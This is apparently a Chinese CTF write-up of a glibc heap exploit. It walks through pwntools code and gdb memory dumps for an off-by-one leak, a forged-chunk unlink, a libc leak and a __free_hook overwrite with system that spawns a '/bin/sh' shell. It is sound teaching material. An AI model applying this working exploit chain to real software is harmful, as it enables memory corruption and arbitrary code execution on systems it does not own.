<p>同样，我只讲解exp部分的内容，其余一样是准备工作</p>
<h5 id="填充并泄露堆块1地址"><a href="#填充并泄露堆块1地址" class="headerlink" title="填充并泄露堆块1地址"></a>填充并泄露堆块1地址</h5><p>一样的过程，利用off-by-one泄露地址，不讲了，只讲重点</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">": "</span>, <span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">'11111'</span>, <span class="number">0x20</span>, <span class="string">'b'</span>) <span class="comment">#1</span></span><br><span class="line">printf()</span><br><span class="line">io.recvuntil(<span class="string">'Author: '</span>)</span><br><span class="line">io.recvuntil(<span class="string">"author"</span>)</span><br><span class="line">first_heap = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br></pre></td></tr></table></figure>
<h5 id="创建堆块并remove掉"><a href="#创建堆块并remove掉" class="headerlink" title="创建堆块并remove掉"></a>创建堆块并remove掉</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x20</span>, <span class="string">"22222"</span>, <span class="number">0x20</span>, <span class="string">"desc buf"</span>) <span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">"33333"</span>, <span class="number">0x20</span>, <span class="string">"desc buf"</span>) <span class="comment">#3</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>这里是要将book6的结构体位置放到前面，方便利用，你可以自己去调试试试，不这样做的话，位置很难找，因为他定义的存储这个结构体的大小也是0x20+0x10(数据部分+结构部分)</p>
<h5 id="unlink部分-重点"><a href="#unlink部分-重点" class="headerlink" title="unlink部分(重点)"></a>unlink部分(重点)</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x20</span>, <span class="string">"33333"</span>, <span class="number">0x108</span>, <span class="string">'overflow'</span>) <span class="comment">#4</span></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">"44444"</span>, <span class="number">0x100</span><span class="number">-0x10</span>, <span class="string">'target'</span>) <span class="comment">#5</span></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">"/bin/sh\x00"</span>, <span class="number">0x200</span>, <span class="string">'to arbitrary read and write'</span>) <span class="comment">#6</span></span><br><span class="line">heap_base = first_heap - <span class="number">0x80</span></span><br><span class="line">ptr = heap_base + <span class="number">0x180</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>) + <span class="string">'\x00'</span>*<span class="number">0xe0</span> + p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">remove(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
<ol>
<li>创建两个smallchunk，因为unlink只有在smallbin下才可以，fastbin不行</li>
<li>最后一个chunk是用来编辑的，以及free的，free的参数要带/bin/sh，就是要将他改写成system函数</li>
<li>heap_base = first_heap - 0x80这个偏移自己定，每次调试可能都不一样，反正只要对的上你自己调试的时候就行，方便自己计算，我这里调试的时候是<br>[+] first_heap: 0x56182d174080所以减了0x80</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5653ee7a5080</span></span><br><span class="line"><span class="number">0x5653ee7a5080</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005653ee7a5020</span></span><br><span class="line"><span class="number">0x5653ee7a5090</span>:	<span class="number">0x00005653ee7a5050</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5653ee7a50a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a50b0</span>:	<span class="number">0x0000000000000006</span>	<span class="number">0x00005653ee7a50e0</span></span><br><span class="line"><span class="number">0x5653ee7a50c0</span>:	<span class="number">0x00005653ee7a53e0</span>	<span class="number">0x0000000000000200</span></span><br><span class="line"><span class="number">0x5653ee7a50d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a50e0</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a50f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a5110</span>:	<span class="number">0x0000565300000005</span>	<span class="number">0x00005653ee7a5140</span></span><br><span class="line"><span class="number">0x5653ee7a5120</span>:	<span class="number">0x00005653ee7a52e0</span>	<span class="number">0x00000000000000f0</span></span><br><span class="line"><span class="number">0x5653ee7a5130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a5140</span>:	<span class="number">0x0000003434343434</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a5170</span>:	<span class="number">0x0000565300000004</span>	<span class="number">0x00005653ee7a51a0</span></span><br><span class="line"><span class="number">0x5653ee7a5180</span>:	<span class="number">0x00005653ee7a51d0</span>	<span class="number">0x0000000000000108</span></span><br><span class="line"><span class="number">0x5653ee7a5190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a51a0</span>:	<span class="number">0x0000003333333333</span>	<span class="number">0x00005653ee7a5140</span></span><br><span class="line"><span class="number">0x5653ee7a51b0</span>:	<span class="number">0x00005653ee7a5170</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5653ee7a51c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span> #chunk4</span><br><span class="line"><span class="number">0x5653ee7a51d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000101</span> #实际可以写部分</span><br><span class="line"><span class="number">0x5653ee7a51e0</span>:	<span class="number">0x00005653ee7a5168</span>	<span class="number">0x00005653ee7a5170</span></span><br><span class="line"><span class="number">0x5653ee7a51f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>这是我显示first_heap后的数据，0x5653ee7a51d0便是申请的0x108的chunk，我在这里伪造了一个chunk，fd和bk在0x5653ee7a51e0，然后通过溢出将下个chunk的pre_size改成我这个伪造的chunk大小<br>在看看相邻的堆块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5653ee7a51c0</span></span><br><span class="line"><span class="number">0x5653ee7a51c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line"><span class="number">0x5653ee7a51d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000101</span> #伪造的chunk记为p</span><br><span class="line"><span class="number">0x5653ee7a51e0</span>:	<span class="number">0x00005653ee7a5168</span>	<span class="number">0x00005653ee7a5170</span></span><br><span class="line"><span class="number">0x5653ee7a51f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5210</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5220</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5230</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5240</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5260</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5270</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5280</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5290</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a52a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a52b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a52c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a52d0</span>:	<span class="number">0x0000000000000100</span>	<span class="number">0x0000000000000100</span> #chunk5</span><br><span class="line"><span class="number">0x5653ee7a52e0</span>:	<span class="number">0x0000746567726174</span>	<span class="number">0x0000000000000000</span> #实际可以写部分</span><br><span class="line"><span class="number">0x5653ee7a52f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5300</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5310</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5320</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5330</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5340</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>这时候我remove(5)的话，会变成什么样呢？他会unlink(p)，然后将chunk5向前合并，不信试试看，这里数据需要精心构造，才能造成任意写的能力<br>remove(5)效果，变成了201，这是合并的效果，然后地址部分指向了libc部分的地址，如果我们能泄露这部分地址，就获得libc<br>还有个重点，我们的unlink过程没显示出来，我们分析下，unlink(p)做了啥<br>假设我们chunk4数据部分的地址为myptr<br>这里unlink(p)</p>
<ol>
<li>FD = ptr-0x18</li>
<li>BK = ptr-0x10</li>
<li>检测FD-&gt;bk==p? &amp;&amp; BK-&gt;fd == p?</li>
<li>检测成功过后</li>
<li>FD-&gt;bk &lt;=&gt; FD+0x18 &lt;=&gt; <em>(ptr-0x18+0x18) = BK = ptr-0x10 实际就是</em>ptr=ptr-0x10</li>
<li>BK-&gt;FD &lt;=&gt; BK+0x10 &lt;=&gt; <em>(ptr-0x10+0x10) = FD = ptr-0x18 实际就是</em>ptr=ptr-0x18<br>重点在第6行，我们将*ptr改成了ptr-0x18</li>
</ol>
<p>看ptr是哪里</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">10</span>gx <span class="number">0x5577f976f080</span><span class="number">-0x80</span>+<span class="number">0x180</span></span><br><span class="line"><span class="number">0x5577f976f180</span>:	<span class="number">0x00005577f976f168</span>	<span class="number">0x0000000000000108</span></span><br><span class="line"><span class="number">0x5577f976f190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f1a0</span>:	<span class="number">0x0000003333333333</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f1b0</span>:	<span class="number">0x00005577f976f170</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f1c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br></pre></td></tr></table></figure>
<p>从整体来看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5577f976f080</span></span><br><span class="line"><span class="number">0x5577f976f080</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005577f976f020</span></span><br><span class="line"><span class="number">0x5577f976f090</span>:	<span class="number">0x00005577f976f050</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f0a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f0b0</span>:	<span class="number">0x0000000000000006</span>	<span class="number">0x00005577f976f0e0</span></span><br><span class="line"><span class="number">0x5577f976f0c0</span>:	<span class="number">0x00005577f976f3e0</span>	<span class="number">0x0000000000000200</span></span><br><span class="line"><span class="number">0x5577f976f0d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f0e0</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f0f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f110</span>:	<span class="number">0x00005577f976f130</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f120</span>:	<span class="number">0x00005577f976f2e0</span>	<span class="number">0x00000000000000f0</span></span><br><span class="line"><span class="number">0x5577f976f130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f170</span>:	<span class="number">0x0000557700000004</span>	<span class="number">0x00005577f976f1a0</span> #book4结构体</span><br><span class="line"><span class="number">0x5577f976f180</span>:	<span class="number">0x00005577f976f168</span>	<span class="number">0x0000000000000108</span> <span class="meta">#ptr，</span></span><br><span class="line"><span class="number">0x5577f976f190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f1a0</span>:	<span class="number">0x0000003333333333</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f1b0</span>:	<span class="number">0x00005577f976f170</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f1c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line"><span class="number">0x5577f976f1d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000201</span></span><br><span class="line"><span class="number">0x5577f976f1e0</span>:	<span class="number">0x00007f452ad38b78</span>	<span class="number">0x00007f452ad38b78</span></span><br><span class="line"><span class="number">0x5577f976f1f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>*ptr = ptr -0x18,也就是0x5577f976f180里的内容改为0x5577f976f168</p>
<p>这样，再次edit(4,payload)的话就可以修改从168开始的size以及name和description指针</p>
<p>合并效果</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5577f976f1c0</span></span><br><span class="line"><span class="number">0x5577f976f1c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line"><span class="number">0x5577f976f1d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000201</span></span><br><span class="line"><span class="number">0x5577f976f1e0</span>:	<span class="number">0x00007f452ad38b78</span>	<span class="number">0x00007f452ad38b78</span></span><br><span class="line"><span class="number">0x5577f976f1f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f210</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f220</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f230</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f240</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f260</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f270</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f280</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f290</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2d0</span>:	<span class="number">0x0000000000000100</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x5577f976f2e0</span>:	<span class="number">0x0000746567726174</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f300</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f310</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f320</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f330</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f340</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<h5 id="再次修改book4的结构体"><a href="#再次修改book4的结构体" class="headerlink" title="再次修改book4的结构体"></a>再次修改book4的结构体</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0x30</span>) + p64(<span class="number">4</span>) + p64(first_heap+<span class="number">0x40</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">edit(<span class="number">4</span>, p64(heap_base + <span class="number">0x1e0</span>))</span><br><span class="line">printf()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">content = io.recvline()</span><br><span class="line">io.info(content)</span><br><span class="line">libc_base = u64(content.strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x3c4b7</span></span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">io.success(<span class="string">'system: 0x%x'</span> % system_addr)</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br></pre></td></tr></table></figure>
<p>0x30是他原来大小，4为id 4， 然后我将name和description指针都改为first_heap+0x40处，为什么是这里呢？因为，这里是book6的结构体部分的description部分指针，这样就获得了任意地址读写的能力，<br>第二次edit(4, p64(heap_base + 0x1e0))的时候就是将book6的description指针改成指向heap_base + 0x1e0处，为什么是这里，看上面<br>从整体来看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5577f976f080</span></span><br><span class="line"><span class="number">0x5577f976f080</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005577f976f020</span></span><br><span class="line"><span class="number">0x5577f976f090</span>:	<span class="number">0x00005577f976f050</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f0a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f0b0</span>:	<span class="number">0x0000000000000006</span>	<span class="number">0x00005577f976f0e0</span></span><br><span class="line"><span class="number">0x5577f976f0c0</span>:	<span class="number">0x00005577f976f3e0</span>	<span class="number">0x0000000000000200</span></span><br><span class="line"><span class="number">0x5577f976f0d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f0e0</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f0f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f110</span>:	<span class="number">0x00005577f976f130</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f120</span>:	<span class="number">0x00005577f976f2e0</span>	<span class="number">0x00000000000000f0</span></span><br><span class="line"><span class="number">0x5577f976f130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f170</span>:	<span class="number">0x0000557700000004</span>	<span class="number">0x00005577f976f1a0</span> </span><br><span class="line"><span class="number">0x5577f976f180</span>:	<span class="number">0x00005577f976f168</span>	<span class="number">0x0000000000000108</span> </span><br><span class="line"><span class="number">0x5577f976f190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f1a0</span>:	<span class="number">0x0000003333333333</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f1b0</span>:	<span class="number">0x00005577f976f170</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f1c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line"><span class="number">0x5577f976f1d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000201</span></span><br><span class="line"><span class="number">0x5577f976f1e0</span>:	<span class="number">0x00007f452ad38b78</span>	<span class="number">0x00007f452ad38b78</span> <span class="meta">#libc地址</span></span><br><span class="line"><span class="number">0x5577f976f1f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>这样就泄露了libc地址，那个固定偏移，也是利用vmmap查看，然后相减获得的</p>
<h5 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(free_hook) + p64(<span class="number">0x200</span>)</span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">edit(<span class="number">6</span>, p64(system_addr))</span><br><span class="line">io.success(<span class="string">'first_heap: 0x%x'</span> % first_heap)</span><br><span class="line">remove(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br></pre></td></tr></table></figure>
<ol>
<li>edit(4,payload)这里将book6的description指针指向free_hook</li>
<li>然后edit是改成system地址，最后调用一次free就成了<h2 id="课后小知识总结"><a href="#课后小知识总结" class="headerlink" title="课后小知识总结"></a>课后小知识总结</h2></li>
<li>在gdb中用find查找字符串，可以获得指定位置</li>
<li>堆块会复用，就是free过后的小堆块，在再次malloc后会用相同的堆块</li>
<li>在计算的时候可以以一个为基地址，这样好计算</li>
